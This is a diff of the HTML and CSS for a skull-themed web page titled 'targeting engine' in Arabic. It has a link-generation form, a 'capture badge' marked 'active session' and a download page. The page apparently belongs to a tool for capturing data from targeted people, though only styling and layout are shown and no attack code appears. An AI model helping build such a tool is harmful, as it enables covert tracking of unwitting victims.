-            max-width: 840px;
-            padding: 38px 40px 44px;
-            background: rgba(8, 4, 4, 0.90);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 2px solid rgba(204, 10, 10, 0.06);
-            border-radius: 0;
-            box-shadow: 0 0 120px rgba(204, 10, 10, 0.03), inset 0 0 120px rgba(0, 0, 0, 0.6);
-            position: relative;
-            overflow: hidden;
-            clip-path: polygon(0% 0%, 100% 0%, 99% 100%, 1% 100%);
-        }
-        #cardArea::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(204, 10, 10, 0.008) 30px, rgba(204, 10, 10, 0.008) 34px),
-                repeating-linear-gradient(-45deg, transparent, transparent 45px, rgba(80, 0, 0, 0.01) 45px, rgba(80, 0, 0, 0.01) 50px);
-            pointer-events: none;
-        }
-        #cardArea::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
-            background-size: 300% 100%;
-            animation: blood-scan 3.8s linear infinite;
-        }
-
-        .card-blood-drip {
-            position: absolute;
-            width: 3.5px;
-            background: linear-gradient(180deg, var(--blood-pure), transparent);
-            pointer-events: none;
-            z-index: 3;
-            animation: drip-card var(--drip-duration, 6s) ease-in infinite;
-            opacity: 0;
-            border-radius: 0 0 50% 50%;
-        }
-        @keyframes drip-card {
-            0% {
-                opacity: 0;
-                height: 0;
-                transform: translateY(0);
-            }
-            15% {
-                opacity: 0.8;
-            }
-            85% {
-                opacity: 0.3;
-            }
-            100% {
-                opacity: 0;
-                height: var(--drip-height, 90px);
-                transform: translateY(var(--drip-offset, 25px));
-            }
-        }
-
-        .card-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        /* ================================================================
-           MAIN TITLE
-           ================================================================ */
-        .main-title {
-            font-size: 40px;
-            font-weight: 900;
-            letter-spacing: 2px;
-            margin: 0 0 8px;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            font-family: var(--font-display);
-            text-shadow: 0 0 60px rgba(204, 10, 10, 0.1);
-        }
-        .main-title i {
-            color: var(--blood-pure);
-            font-size: 38px;
-            filter: drop-shadow(0 0 60px var(--blood-glow));
-            animation: flicker-fire 2.8s infinite;
-        }
-        @keyframes flicker-fire {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1) rotate(0deg);
-            }
-            25% {
-                opacity: 0.6;
-                transform: scale(1.06) rotate(-2deg);
-            }
-            65% {
-                opacity: 0.8;
-                transform: scale(0.94) rotate(2deg);
-            }
-        }
-
-        .main-sub {
-            color: var(--text-hell);
-            font-size: 14px;
-            font-weight: 400;
-            margin-bottom: 32px;
-            border-right: 4px solid var(--blood-pure);
-            padding-right: 24px;
-            font-family: var(--font-mono);
-            background: rgba(0, 0, 0, 0.3);
-            padding: 14px 24px;
-            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.4);
-            letter-spacing: 0.5px;
-            border: 1px solid rgba(204, 10, 10, 0.04);
-        }
-        .main-sub i {
-            color: var(--blood-pure);
-            margin-left: 12px;
-        }
-
-        /* ================================================================
-           FORM
-           ================================================================ */
-        .form-modern {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 26px 28px 30px;
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            box-shadow: inset 0 0 100px rgba(0, 0, 0, 0.4);
-            position: relative;
-        }
-        .form-modern::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: 5%;
-            width: 90%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
-            background-size: 200% 100%;
-            animation: fire-scan 4s linear infinite;
-        }
-        @keyframes fire-scan {
-            0% {
-                background-position: 0% 0%;
-            }
-            100% {
-                background-position: 200% 0%;
-            }
-        }
-
-        .field-group {
-            margin-bottom: 20px;
-        }
-        .field-group label {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            color: var(--text-hell);
-            font-weight: 700;
-            font-size: 14px;
-            margin-bottom: 8px;
-            letter-spacing: 3px;
-            font-family: var(--font-display);
-        }
-        .field-group label i {
-            color: var(--blood-pure);
-            width: 24px;
-            font-size: 18px;
-            filter: drop-shadow(0 0 20px rgba(204, 10, 10, 0.1));
-        }
-        .field-group input[type="text"] {
-            width: 100%;
-            padding: 18px 24px;
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            background: rgba(0, 0, 0, 0.6);
-            color: #d4b0a0;
-            font-size: 16px;
-            font-family: var(--font-mono);
-            outline: none;
-            transition: var(--transition);
-            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.3);
-            border-radius: 0;
-        }
-        .field-group input[type="text"]:focus {
-            border-color: var(--blood-pure);
-            box-shadow: 0 0 60px rgba(204, 10, 10, 0.04), inset 0 0 60px rgba(0, 0, 0, 0.3);
-            background: #0f0808;
-        }
-        .field-group input::placeholder {
-            color: #4a2a2a;
-            font-weight: 400;
-            letter-spacing: 1px;
-        }
-
-        /* ================================================================
-           CHECKBOX
-           ================================================================ */
-        .features-label {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            color: var(--text-hell);
-            font-weight: 700;
-            font-size: 14px;
-            margin: 8px 0 18px;
-            font-family: var(--font-display);
-            letter-spacing: 2px;
-        }
-        .features-label i {
-            color: var(--blood-pure);
-            font-size: 18px;
-        }
-
-        .checkbox-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            max-height: 280px;
-            overflow-y: auto;
-            padding: 8px 6px 8px 0;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(204, 10, 10, 0.03);
-            scrollbar-width: thin;
-            scrollbar-color: var(--blood-pure) transparent;
-        }
-        .checkbox-grid::-webkit-scrollbar {
-            width: 4px;
-        }
-        .checkbox-grid::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        .checkbox-grid::-webkit-scrollbar-thumb {
-            background: var(--blood-pure);
-            border-radius: 0;
-        }
-        @media (max-width: 540px) {
-            .checkbox-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .checkbox-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 20px;
-            background: rgba(16, 4, 4, 0.2);
-            transition: var(--transition);
-            cursor: pointer;
-            border: 1px solid transparent;
-        }
-        .checkbox-item:hover {
-            background: rgba(204, 10, 10, 0.03);
-            border-color: rgba(204, 10, 10, 0.06);
-        }
-        .checkbox-item input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            accent-color: var(--blood-pure);
-            cursor: pointer;
-            flex-shrink: 0;
-            filter: drop-shadow(0 0 20px rgba(204, 10, 10, 0.05));
-        }
-        .checkbox-item label {
-            margin: 0;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            color: var(--text-hell);
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            flex: 1;
-            font-family: var(--font-mono);
-            letter-spacing: 0.5px;
-        }
-        .checkbox-item label i {
-            color: #3a2a2a;
-            font-size: 16px;
-            width: 24px;
-            text-align: center;
-            transition: var(--transition);
-        }
-        .checkbox-item input:checked+.label-text i {
-            color: var(--blood-pure);
-            filter: drop-shadow(0 0 30px var(--blood-glow));
-        }
-        .label-text {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        /* ================================================================
-           BUTTON
-           ================================================================ */
-        .btn-primary {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-            width: 100%;
-            padding: 16px 24px;
-            border: none;
-            background: linear-gradient(135deg, #4a0a0a, #1a0000, #6a0a0a);
-            color: #fff;
-            font-weight: 900;
-            font-size: 17px;
-            font-family: var(--font-display);
-            cursor: pointer;
-            margin-top: 24px;
-            transition: var(--transition);
-            box-shadow: 0 0 80px rgba(204, 10, 10, 0.04), inset 0 -4px 0 #1a0000;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            clip-path: polygon(0% 0%, 94% 0%, 100% 25%, 100% 100%, 6% 100%, 0% 75%);
-            position: relative;
-            overflow: hidden;
-            text-shadow: 0 0 30px rgba(204, 10, 10, 0.1);
-        }
-        .btn-primary::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 200%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(204, 10, 10, 0.08), transparent);
-            transform: skewX(-30deg);
-            animation: fire-sweep 3s linear infinite;
-        }
-        @keyframes fire-sweep {
-            0% {
-                left: -100%;
-            }
-            100% {
-                left: 100%;
-            }
-        }
-        .btn-primary::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
-            animation: blood-scan 2.5s linear infinite;
-        }
-        .btn-primary:hover {
-            transform: translateY(-4px) scale(1.01);
-            box-shadow: 0 0 120px rgba(204, 10, 10, 0.08), inset 0 -4px 0 #3a0000;
-            background: linear-gradient(135deg, #6a0a0a, #2a0000, #8a0a0a);
-        }
-        .btn-primary i {
-            font-size: 22px;
-            color: #ff8888;
-            text-shadow: 0 0 40px #ff2200;
-        }
-
-        /* ================================================================
-           RESULT BOX
-           ================================================================ */
-        .result-box {
-            margin-top: 24px;
-            padding: 20px 24px;
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid rgba(204, 10, 10, 0.06);
-            display: flex;
-            align-items: flex-start;
-            gap: 20px;
-            justify-content: space-between;
-            display: none;
-            box-shadow: inset 0 0 80px rgba(0, 0, 0, 0.3);
-            position: relative;
-            flex-wrap: wrap;
-        }
-        .result-box::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(45deg, transparent, transparent 40px, rgba(204, 10, 10, 0.005) 40px, rgba(204, 10, 10, 0.005) 44px);
-            pointer-events: none;
-        }
-        .result-box .link-text {
-            flex: 1;
-            color: #d4b0a0;
-            font-size: 14px;
-            font-weight: 500;
-            word-break: break-all;
-            font-family: var(--font-mono);
-            direction: ltr;
-            text-align: left;
-            position: relative;
-            z-index: 1;
-            line-height: 2;
-            white-space: pre-wrap;
-            min-width: 200px;
-        }
-        .result-box .link-text i {
-            color: var(--blood-pure);
-            margin-left: 10px;
-        }
-
-        .btn-copy {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 30px;
-            background: rgba(204, 10, 10, 0.02);
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            color: #d4b0a0;
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            transition: var(--transition);
-            font-family: var(--font-mono);
-            flex-shrink: 0;
-            clip-path: polygon(0% 0%, 88% 0%, 100% 15%, 100% 100%, 12% 100%, 0% 85%);
-            position: relative;
-            z-index: 1;
-            letter-spacing: 1px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
-        }
-        .btn-copy:hover {
-            background: rgba(204, 10, 10, 0.06);
-            border-color: var(--blood-pure);
-            color: #fff;
-            box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
-        }
-        .btn-copy i {
-            font-size: 16px;
-            color: var(--blood-pure);
-        }
-
-        /* ================================================================
-           FOOTER
-           ================================================================ */
-        .madeby {
-            margin-top: 36px;
-            text-align: center;
-            font-size: 13px;
-            font-weight: 400;
-            letter-spacing: 4px;
-            display: flex;
-            align-items: center;
-            gap: 24px;
-            flex-wrap: wrap;
-            justify-content: center;
-            border-top: 1px solid rgba(204, 10, 10, 0.04);
-            padding-top: 28px;
-            width: 100%;
-            max-width: 840px;
-            font-family: var(--font-display);
-            text-transform: uppercase;
-            color: #4a3a3a;
-        }
-        .madeby .sep {
-            opacity: 0.1;
-        }
-        .madeby .dev-block {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            background: rgba(204, 10, 10, 0.02);
-            padding: 8px 28px;
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
-            animation: dev-pulse 3s ease-in-out infinite;
-        }
-        @keyframes dev-pulse {
-            0%,
-            100% {
-                border-color: rgba(204, 10, 10, 0.04);
-                box-shadow: 0 0 30px rgba(204, 10, 10, 0.01);
-            }
-            50% {
-                border-color: rgba(204, 10, 10, 0.15);
-                box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
-            }
-        }
-        .madeby .dev-block i {
-            color: var(--blood-pure);
-            font-size: 18px;
-        }
-        .madeby .dev-block .dev-name {
-            color: var(--blood-pure);
-            font-weight: 900;
-            text-shadow: 0 0 40px rgba(204, 10, 10, 0.1);
-            font-size: 18px;
-            letter-spacing: 4px;
-            background: linear-gradient(135deg, #ff4444, #aa0000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        /* ================================================================
-           CAPTURE BADGE
-           ================================================================ */
-        #captureBadge {
-            position: fixed;
-            top: 22px;
-            right: 22px;
-            z-index: 9998;
-            background: rgba(5, 3, 3, 0.92);
-            backdrop-filter: blur(16px);
-            padding: 12px 30px;
-            font-weight: 700;
-            font-size: 12px;
-            color: var(--blood-pure);
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            display: none;
-            align-items: center;
-            gap: 16px;
-            box-shadow: 0 0 80px rgba(204, 10, 10, 0.02);
-            font-family: var(--font-mono);
-            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
-            letter-spacing: 2px;
-        }
-        #captureBadge i {
-            font-size: 16px;
-            color: var(--hellfire);
-        }
-        #captureBadge .pulse-ring {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--blood-pure);
-            animation: pulse-dot 1.4s infinite;
-            box-shadow: 0 0 40px var(--blood-glow);
-        }
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.1;
-                transform: scale(0.4);
-            }
-        }
-
-        /* ================================================================
-           SIDE PAGE
-           ================================================================ */
-        .download-page {
-            width: 100%;
-            min-height: 100vh;
-            background: var(--obsidian);
-            padding: 30px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: var(--font-mono);
-        }
-        .download-box {
-            max-width: 600px;
-            width: 100%;
-            background: rgba(8, 4, 4, 0.92);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 2px solid rgba(204, 10, 10, 0.06);
-            padding: 40px 36px 44px;
-            box-shadow: 0 0 120px rgba(204, 10, 10, 0.02), inset 0 0 120px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
-            position: relative;
-            overflow: hidden;
-        }
-        .download-box::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(204, 10, 10, 0.006) 30px, rgba(204, 10, 10, 0.006) 34px),
-                repeating-linear-gradient(-45deg, transparent, transparent 45px, rgba(80, 0, 0, 0.008) 45px, rgba(80, 0, 0, 0.008) 50px);
-            pointer-events: none;
-        }
-        .download-box::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
-            background-size: 300% 100%;
-            animation: blood-scan 4s linear infinite;
-        }
-
-        .download-box h2 {
-            color: #d4b0a0;
-            font-size: 18px;
-            font-weight: 700;
-            line-height: 2;
-            margin-bottom: 30px;
-            border-right: 4px solid var(--blood-pure);
-            padding-right: 24px;
-            text-align: right;
-            font-family: var(--font-display);
-            letter-spacing: 2px;
-        }
-        .download-box h2 i {
-            color: var(--blood-pure);
-            margin-left: 12px;
-        }
-
-        .download-box .ad-area {
-            margin: 22px 0;
-            padding: 16px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(204, 10, 10, 0.02);
-            min-height: 80px;
-        }
-        .download-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 18px;
-            background: linear-gradient(135deg, #4a0a0a, #1a0000);
-            color: #fff;
-            padding: 22px 56px;
-            font-size: 20px;
-            font-weight: 900;
-            border: none;
-            cursor: pointer;
-            transition: var(--transition);
-            box-shadow: 0 0 80px rgba(204, 10, 10, 0.02);
-            font-family: var(--font-display);
-            margin: 16px 0 8px;
-            clip-path: polygon(0% 0%, 94% 0%, 100% 20%, 100% 100%, 6% 100%, 0% 80%);
-            letter-spacing: 4px;
-            text-transform: uppercase;
-        }
-        .download-btn:hover {
-            background: linear-gradient(135deg, #6a0a0a, #2a0000);
-            transform: scale(1.02);
-            box-shadow: 0 0 120px rgba(204, 10, 10, 0.04);
-        }
-        .download-btn i {
-            font-size: 26px;
-            color: #ff8888;
-            text-shadow: 0 0 40px #ff2200;
-        }
-
-        .download-footer {
-            margin-top: 32px;
-            font-size: 13px;
-            color: #4a3a3a;
-            border-top: 1px solid rgba(204, 10, 10, 0.04);
-            padding-top: 24px;
-            font-family: var(--font-display);
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-        .download-footer .dev-block {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            background: rgba(204, 10, 10, 0.02);
-            padding: 6px 24px;
-            border: 1px solid rgba(204, 10, 10, 0.04);
-            clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
-        }
-        .download-footer .dev-block i {
-            color: var(--blood-pure);
-            font-size: 16px;
-        }
-        .download-footer .dev-block .dev-name {
-            color: var(--blood-pure);
-            font-weight: 900;
-            text-shadow: 0 0 30px rgba(204, 10, 10, 0.1);
-            font-size: 16px;
-            letter-spacing: 3px;
-            background: linear-gradient(135deg, #ff4444, #aa0000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        /* ===== WELCOME BOX ===== */
+        .welcome-box { width:100%; max-width:840px; margin-bottom:30px; background:rgba(8,4,4,0.90); backdrop-filter:blur(20px); border:2px solid rgba(204,10,10,0.06); padding:28px 32px; clip-path:polygon(0% 0%,100% 0%,99% 100%,1% 100%); box-shadow:0 0 120px rgba(204,10,10,0.03),inset 0 0 120px rgba(0,0,0,0.6); position:relative; overflow:hidden; }
 
         /* ================================================================
            SCROLLBAR
            ================================================================ */
-        ::-webkit-scrollbar {
-            width: 7px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--obsidian);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(180deg, var(--blood-pure), var(--blood-deep));
-            border-radius: 0;
-        }
+        ::-webkit-scrollbar { width: 7px; }
+        ::-webkit-scrollbar-track { background: var(--obsidian); }
+        ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, var(--blood-pure), var(--blood-deep)); border-radius: 0; }
 
         /* ================================================================
            RESPONSIVE
            ================================================================ */
         @media (max-width: 768px) {
-            .header {
-                padding: 12px 18px;
-                flex-wrap: wrap;
-                gap: 12px;
-                justify-content: center;
-            }
-            .brand .bot-name {
-                font-size: 22px;
-                letter-spacing: 3px;
-            }
-            .bot-username-box,
-            .developer-box {
-                font-size: 12px;
-                padding: 6px 18px;
-            }
-            .nav-links {
-                gap: 10px;
-            }
-            #cardArea {
-                padding: 24px 20px 30px;
-            }
-            .main-title {
-                font-size: 28px;
-            }
-            .main-title i {
-                font-size: 28px;
-            }
-            .form-modern {
-                padding: 16px 14px 20px;
-            }
-            .result-box {
-                padding: 16px;
-            }
-            .result-box .link-text {
-                font-size: 13px;
-                line-height: 1.8;
-                white-space: normal;
-            }
-            .madeby .dev-block {
-                padding: 6px 18px;
-            }
-            .madeby .dev-block .dev-name {
-                font-size: 15px;
-            }
-            .download-box {
-                padding: 28px 20px 32px;
-            }
-            .download-btn {
-                padding: 18px 36px;
-                font-size: 17px;
-            }
-            .fire-bottom {
-                height: 60px;
-            }
-            .fire-glow-ring {
-                height: 50px;
-            }
+            .header { padding: 12px 18px; flex-wrap: wrap; gap: 12px; justify-content: center; }
+            .brand .bot-name { font-size: 22px; letter-spacing: 3px; }
+            .bot-username-box, .developer-box { font-size: 12px; padding: 6px 18px; }
+            .nav-links { gap: 10px; }
+            #cardArea { padding: 24px 20px 30px; }
+            .main-title { font-size: 28px; }
+            .main-title i { font-size: 28px; }
+            .form-modern { padding: 16px 14px 20px; }
+            .result-box { padding: 16px; }
+            .result-box .link-text { font-size: 13px; line-height: 1.8; white-space: normal; }
+            .madeby .dev-block { padding: 6px 18px; }
+            .madeby .dev-block .dev-name { font-size: 15px; }
+            .download-box { padding: 28px 20px 32px; }
+            .download-btn { padding: 18px 36px; font-size: 17px; }
+            .fire-bottom { height: 60px; }
+            .fire-glow-ring { height: 50px; }
         }
-
         @media (max-width: 480px) {
-            .brand .bot-name {
-                font-size: 18px;
-                letter-spacing: 2px;
-            }
-            .bot-username-box,
-            .developer-box {
-                font-size: 10px;
-                padding: 4px 12px;
-            }
-            .main-title {
-                font-size: 22px;
-            }
-            .btn-primary {
-                padding: 14px 16px;
-                font-size: 14px;
-            }
-            .download-box {
-                padding: 20px 16px;
-            }
-            .download-btn {
-                padding: 14px 28px;
-                font-size: 15px;
-            }
+            .brand .bot-name { font-size: 18px; letter-spacing: 2px; }
+            .bot-username-box, .developer-box { font-size: 10px; padding: 4px 12px; }
+            .main-title { font-size: 22px; }
+            .btn-primary { padding: 14px 16px; font-size: 14px; }
+            .download-box { padding: 20px 16px; }
+            .download-btn { padding: 14px 28px; font-size: 15px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== CANVAS ===== -->
+    <!-- ============================================================
+       BACKGROUND EFFECTS (Canvas, Rain, Skulls, Decorations, Fire)
+       ============================================================ -->
     <canvas id="hell-canvas"></canvas>
-
-    <!-- ===== BLOOD RAIN ===== -->
     <div class="blood-rain" id="bloodRain"></div>
-
-    <!-- ===== SKULLS ===== -->
     <div class="skull-bg" style="top:12%;left:2%;width:100px;height:130px;">
-        <svg viewBox="0 0 100 130">
-            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.12)" stroke="rgba(204,10,10,0.04)" stroke-width="1.5"/>
-            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(204,10,10,0.03)" stroke-width="1"/>
-            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(204,10,10,0.03)" stroke-width="1"/>
-            <path d="M35,50 Q40,45 45,50" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/>
-            <path d="M55,50 Q60,45 65,50" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/>
-            <path d="M40,70 Q50,80 60,70" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/>
-        </svg>
+        <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.12)" stroke="rgba(204,10,10,0.04)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(204,10,10,0.03)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(204,10,10,0.03)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(204,10,10,0.03)" stroke-width="1" fill="none"/></svg>
     </div>
     <div class="skull-bg" style="bottom:8%;right:2%;width:120px;height:155px;transform:rotate(15deg);">
-        <svg viewBox="0 0 100 130">
-            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.10)" stroke="rgba(204,10,10,0.03)" stroke-width="1.5"/>
-            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(204,10,10,0.02)" stroke-width="1"/>
-            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(204,10,10,0.02)" stroke-width="1"/>
-            <path d="M35,50 Q40,45 45,50" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/>
-            <path d="M55,50 Q60,45 65,50" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/>
-            <path d="M40,70 Q50,80 60,70" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/>
-        </svg>
+        <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.10)" stroke="rgba(204,10,10,0.03)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(204,10,10,0.02)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(204,10,10,0.02)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(204,10,10,0.02)" stroke-width="1" fill="none"/></svg>
     </div>
-
-    <!-- ===== DECORATIVE ELEMENTS ===== -->
     <div class="deco-element vertical" style="top:5%;left:2.5%;height:120px;"></div>
     <div class="deco-element vertical" style="top:5%;right:2.5%;height:120px;"></div>
     <div class="deco-element horizontal" style="top:5%;left:14%;width:120px;"></div>
@@ -1218,22 +219,18 @@
     <div class="deco-element corner-br" style="bottom:8%;right:3%;"></div>
     <div class="deco-element diamond" style="top:50%;left:1.5%;"></div>
     <div class="deco-element diamond" style="top:50%;right:1.5%;"></div>
-
-    <!-- ===== FIRE BOTTOM ===== -->
     <div class="fire-bottom"></div>
     <div class="fire-glow-ring"></div>
 
     <!-- ===== CAPTURE BADGE ===== -->
-    <div id="captureBadge">
-        <i class="fas fa-skull-crossbones"></i>
-        <span class="pulse-ring"></span>
-        <span>جلسة نشطة</span>
-    </div>
+    <div id="captureBadge"><i class="fas fa-skull-crossbones"></i><span class="pulse-ring"></span><span>جلسة نشطة</span></div>
 
-    <!-- ===== APP WRAP ===== -->
+    <!-- ============================================================
+       MAIN APPLICATION WRAP
+       ============================================================ -->
     <div class="app-wrap">
 
-        <!-- HEADER -->
+        <!-- ===== HEADER ===== -->
         <header class="header">
             <div class="brand">
                 <i class="fas fa-skull-crossbones brand-icon"></i>
@@ -1249,11 +246,9 @@
             </div>
         </header>
 
-        <!-- ===== رسالة الترحيب (تظهر عند فتح الموقع) ===== -->
-        <div id="welcomeBox" style="width:100%;max-width:840px;margin-bottom:30px;background:rgba(8,4,4,0.90);backdrop-filter:blur(20px);border:2px solid rgba(204,10,10,0.06);padding:28px 32px;clip-path:polygon(0% 0%,100% 0%,99% 100%,1% 100%);box-shadow:0 0 120px rgba(204,10,10,0.03),inset 0 0 120px rgba(0,0,0,0.6);position:relative;overflow:hidden;">
-            <div style="font-family:'Cinzel',serif;font-size:22px;color:#fff;text-align:center;letter-spacing:3px;margin-bottom:10px;">
-                ⭑ ᴡᴇʟᴄᴏᴍᴇ ⭒
-            </div>
+        <!-- ===== WELCOME BOX ===== -->
+        <div class="welcome-box" id="welcomeBox">
+            <div style="font-family:'Cinzel',serif;font-size:22px;color:#fff;text-align:center;letter-spacing:3px;margin-bottom:10px;">⭑ ᴡᴇʟᴄᴏᴍᴇ ⭒</div>
             <div style="font-family:'JetBrains Mono',monospace;font-size:14px;color:#d4b0a0;text-align:center;line-height:2;white-space:pre-wrap;direction:ltr;">
                 ╭⊚─〔 ᴡᴇʟᴄᴏᴍᴇ 〕───────
                 ┃˹🜏˼ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒
@@ -1269,85 +264,48 @@
             </div>
         </div>
 
-        <!-- CARD -->
+        <!-- ===== MAIN CARD ===== -->
         <div class="main-card" id="cardArea">
             <div class="card-content">
-
                 <div class="card-blood-drip" style="top:3%;right:-2px;--drip-duration:5s;--drip-height:90px;--drip-offset:20px;"></div>
                 <div class="card-blood-drip" style="bottom:15%;left:-2px;--drip-duration:6.5s;--drip-height:110px;--drip-offset:30px;"></div>
                 <div class="card-blood-drip" style="top:35%;right:-2px;--drip-duration:7s;--drip-height:70px;--drip-offset:15px;"></div>
                 <div class="card-blood-drip" style="bottom:45%;left:-2px;--drip-duration:5.8s;--drip-height:80px;--drip-offset:22px;"></div>
 
-                <h1 class="main-title">
-                    <i class="fas fa-skull-crossbones"></i> محرك الاستهداف
-                </h1>
-                <p class="main-sub">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    استخدام هذه الأداة في أغراض غير قانونية ممنوع. المستخدم يتحمل المسؤولية الكاملة.
-                </p>
+                <h1 class="main-title"><i class="fas fa-skull-crossbones"></i> محرك الاستهداف</h1>
